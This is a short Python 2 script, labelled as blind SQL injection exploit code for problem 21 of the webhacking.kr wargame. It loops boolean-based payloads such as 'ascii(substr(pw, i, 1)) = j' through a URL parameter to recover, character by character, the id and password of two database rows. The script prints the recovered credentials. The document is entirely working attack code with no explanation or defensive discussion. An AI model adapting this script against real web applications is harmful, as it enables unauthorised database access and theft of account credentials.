# 2018-05-26
# webhacking.kr prob21
# blind SQLi exploit code

import requests

URL = "http://webhacking.kr/challenge/bonus/bonus-1/index.php?"
SESSID = {"PHPSESSID" : ""}

no1_id = ""
no1_pw = ""
no2_id = ""
no2_pw = ""

#no 1 id
for i in range(1, 6):
    for j in range(97, 123):
        payload = "1 and ascii(substr(id, " + str(i) + ", 1)) = " + str(j)
        response = requests.get(URL + "no=" + payload, cookies = SESSID)
        if "True" in response.text:
            no1_id += chr(j)
            print no1_id
            break
        else:
            print "i: " + str(i) + "  j: " + str(j) + "  (" + chr(j) + ")"

#no 1 pw
for i in range(1, 6):
    for j in range(97, 123):
        payload = "1 and ascii(substr(pw, " + str(i) + ", 1)) = " + str(j)
        response = requests.get(URL + "no=" + payload, cookies = SESSID)
        if "True" in response.text:
            no1_pw += chr(j)
            print no1_pw
            break
        else:
            print "i: " + str(i) + "  j: " + str(j) + "  (" + chr(j) + ")"

#no 2 id
for i in range(1, 6):
    for j in range(97, 123):
        payload = "2 and ascii(substr(id, " + str(i) + ", 1)) = " + str(j)
        response = requests.get(URL + "no=" + payload, cookies = SESSID)
        if "True" in response.text:
            no2_id += chr(j)
            print no2_id
            break
        else:
            print "i: " + str(i) + "  j: " + str(j) + "  (" + chr(j) + ")"

#no 2 pw
for i in range(1, 20):
    for j in range(97, 123):
        payload = "2 and ascii(substr(pw, " + str(i) + ", 1)) = " + str(j)
        response = requests.get(URL + "no=" + payload, cookies = SESSID)
        if "True" in response.text:
            no2_pw += chr(j)
            print no2_pw
            break
        else:
            print "i: " + str(i) + "  j: " + str(j) + "  (" + chr(j) + ")"

print "no1 id : " + no1_id
print "no1 pw : " + no1_pw
print "no2 id : " + no2_id
print "no2 pw : " + no2_pw            
